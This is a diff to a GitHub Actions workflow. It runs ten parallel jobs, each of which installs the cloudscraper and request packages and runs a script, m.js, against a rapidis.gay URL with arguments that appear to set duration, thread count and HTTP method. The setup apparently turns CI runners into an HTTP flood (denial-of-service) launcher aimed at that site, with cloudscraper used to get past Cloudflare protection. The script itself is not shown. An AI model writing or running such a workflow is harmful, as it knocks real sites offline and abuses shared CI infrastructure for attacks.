@@ -7,11 +7,12 @@ on:
     branches: [ main ]
 
 jobs:
-  run-k-script:
-    runs-on: macos-latest  # Changed to macOS
+  parallel-execution:
+    runs-on: ubuntu-latest
     strategy:
       matrix:
-        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]  # 20 parallel jobs
+        # This creates 10 parallel jobs
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
@@ -25,6 +26,6 @@ jobs:
         run: |
           npm install cloudscraper request randomstring
           
-      - name: Run Node script
+      - name: Run Node script with parameters
         run: |
-          node m.js https://rapidis.gay/7778079525-acf93beb-eaa2-4828-9bb9-03e1f49cb04c 300 4 h1
+          node m.js https://rapidis.gay/7778079525-c2e3c44e-510c-42ae-b22f-c71cec14a1c2 300 2 h1
